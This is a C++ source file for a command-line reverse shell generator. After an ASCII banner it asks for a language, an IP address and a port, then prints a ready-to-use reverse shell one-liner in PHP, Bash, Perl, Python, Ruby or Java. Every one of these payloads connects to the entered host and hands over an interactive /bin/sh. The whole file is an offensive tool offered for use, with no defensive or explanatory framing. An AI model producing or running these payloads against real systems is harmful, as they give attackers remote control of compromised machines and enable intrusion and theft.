#include <iostream>

int main()
{
    int i = 0;
    std::cout << 
"██████╗ ███████╗██╗   ██╗███████╗██████╗ ███████╗███████╗\n"<<               
"██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝\n"<<                     
"██████╔╝█████╗  ██║   ██║█████╗  ██████╔╝███████╗█████╗  \n"<<                     
"██╔══██╗██╔══╝  ╚██╗ ██╔╝██╔══╝  ██╔══██╗╚════██║██╔══╝  \n"<<                     
"██║  ██║███████╗ ╚████╔╝ ███████╗██║  ██║███████║███████╗ \n"<<               
"╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ \n"<<                    
                                                                              
"███████╗██╗  ██╗███████╗██╗     ██╗\n"<<                    
"██╔════╝██║  ██║██╔════╝██║     ██║\n"<< 
"███████╗███████║█████╗  ██║     ██║\n"<< 
"╚════██║██╔══██║██╔══╝  ██║     ██║\n"<< 
"███████║██║  ██║███████╗███████╗███████╗\n"<< 
"╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\n"<< 
                                                                             
" ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ \n"<< 
"██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗\n"<< 
"██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝\n"<< 
"██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗\n"<< 
"╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║\n"<< 
" ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝\n\n";
    std::cout << "which language you need your script in?\n";
    std::cout << "1-php\n2-bash\n3-perl\n4-python\n5-ruby\n6-java\n";
    std::cout << "select by number. e.g. 2:\n";

    int index;
    std::cin >> index;
    std::string ipaddr;
    int port;
    std::cout<<"This tool doesn't check whether or not your input for ip field is valid\nPlease make sure you don't type wrong...\n";
    std::cout << "What's your device's ip address:\n";
    std::cin >> ipaddr;
    std::cout << "\nWhat's the port number:";
    std::cin >> port;

    std::cout << "Your code is generated\n";
    switch (index)
    {
    case (1):
        std::cout << "php -r '$sock=fsockopen(\"" << ipaddr << "\"," << port << ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n";
        break;
    case (2):
        std::cout << "bash -i >& /dev/tcp/" << ipaddr << "/" << port << " 0>&1\n";
        break;
    case (3):
        std::cout << "perl -e 'use Socket;$i=\""<<ipaddr<<"\";$p="<<port
        <<";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"<<
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");"<<
        "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n";
        break;
    case (4):
        std::cout << "python -c 'import socket,subprocess,os;"<<
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"<<
        "s.connect((\""<<ipaddr<<"\","<<port<<"));os.dup2(s.fileno(),0);"<<
        " os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n";
        break;
    case (5):
        std::cout << "ruby -rsocket -e'f=TCPSocket.open(\""<<ipaddr<<"\","<<port<<").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n";
        break;
    case (6):
        std::cout << "r = Runtime.getRuntime()\n"<<
        "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/"<<ipaddr<<"/"<<port<<";"<<
        "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\n"<<
        "p.waitFor()\n";
        break;
    default:
        break;
    }
}